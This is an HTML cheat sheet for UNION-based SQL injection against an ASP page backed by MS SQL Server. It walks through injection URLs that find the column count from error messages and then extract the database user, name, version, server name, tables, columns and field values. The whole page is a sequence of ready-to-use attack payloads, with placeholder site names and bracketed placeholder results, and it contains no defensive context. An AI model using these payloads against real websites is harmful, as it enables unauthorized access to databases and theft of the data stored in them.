<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Union</title>
</head><body><br/>
UNION SQL INJECTION - DETECTION<br/>
&nbsp;&#09;<br/>
Integer Injection:<br/>
http://[site]/page.asp?id=1 UNION SELECT ALL 1--<br/>
All queries in an SQL statement containing a UNION operator must have an equal number of expressions in their target lists.<br/>
<br/>
http://[site]/page.asp?id=1 UNION SELECT ALL 1,2--<br/>
<br/>
All queries in an SQL statement containing a UNION operator must have an equal number of expressions in their target lists.<br/>
<br/>
http://[site]/page.asp?id=1 UNION SELECT ALL 1,2,3--<br/>
<br/>
All queries in an SQL statement containing a UNION operator must have an equal number of expressions in their target lists.<br/>
<br/>
http://[site]/page.asp?id=1 UNION SELECT ALL 1,2,3,4--<br/>
<br/>
NO ERROR<br/>
<br/>
&nbsp;<br/>
<br/>
UNION SQL INJECTION - EXTRACT DATABASE USER<br/>
&nbsp;&#09; <br/>
http://[site]/page.asp?id=1 UNION SELECT ALL 1,USER,3,4--<br/>
[DB USER]<br/>
<br/>
&nbsp;<br/>
<br/>
UNION SQL INJECTION - EXTRACT DATABASE NAME<br/>
&nbsp;&#09; <br/>
http://[site]/page.asp?id=1 UNION SELECT ALL 1,DB_NAME,3,4--<br/>
[DB NAME]<br/>
<br/>
&nbsp;<br/>
<br/>
UNION SQL INJECTION - EXTRACT DATABASE VERSION<br/>
&nbsp;&#09; <br/>
http://[site]/page.asp?id=1 UNION SELECT ALL 1,@@VERSION,3,4--<br/>
[DB VERSION]<br/>
<br/>
&nbsp;<br/>
<br/>
UNION SQL INJECTION - EXTRACT SERVER NAME<br/>
&nbsp;&#09; <br/>
http://[site]/page.asp?id=1 UNION SELECT ALL 1,@@SERVERNAME,3,4--<br/>
[SERVER NAME]<br/>
<br/>
&nbsp;<br/>
<br/>
UNION SQL INJECTION - EXTRACT DATABASE TABLES<br/>
&nbsp;&#09;<br/>
http://[site]/page.asp?id=1 &nbsp;UNION SELECT ALL 1,name,3,4 from sysobjects where xtype=char(85)--<br/>
[TABLE NAME 1]<br/>
<br/>
&nbsp;<br/>
<br/>
UNION SQL INJECTION - EXTRACT TABLE COLUMN NAMES<br/>
&nbsp;&#09;<br/>
http://[site]/page.asp?id=1 &nbsp;UNION SELECT ALL 1,column_name,3,4 from DBNAME.information_schema.columns where table_name='TABLE-NAME-1'--<br/>
[COLUMN NAME &nbsp;1]<br/>
<br/>
&nbsp;<br/>
<br/>
UNION SQL INJECTION - EXTRACT 1st FIELD<br/>
&nbsp;&#09; <br/>
http://[site]/page.asp?id=1 &nbsp;UNION SELECT ALL 1,COLUMN-NAME-1,3,4 from TABLE-NAME-1--<br/>
[FIELD 1 VALUE]<br/>
<br/>
&nbsp;<br/>
<br/>
UNION SQL INJECTION - EXTRACT 2nd FIELD<br/>
&nbsp;&#09;<br/>
http://[site]/page.asp?id=1 &nbsp;UNION SELECT ALL 1,COLUMN-NAME-2,3,4 from TABLE-NAME-1-- <br/>
[FIELD 2 VALUE]<br/>
<br/>
&nbsp;<br/>
<br/>
UNION SQL INJECTION - EXTRACT 3nd FIELD<br/>
&nbsp;&#09;<br/>
http://[site]/page.asp?id=1 &nbsp;UNION SELECT ALL 1,COLUMN-NAME-3,3,4 from TABLE-NAME-1--<br/>
[FIELD 3 VALUE]</body></html>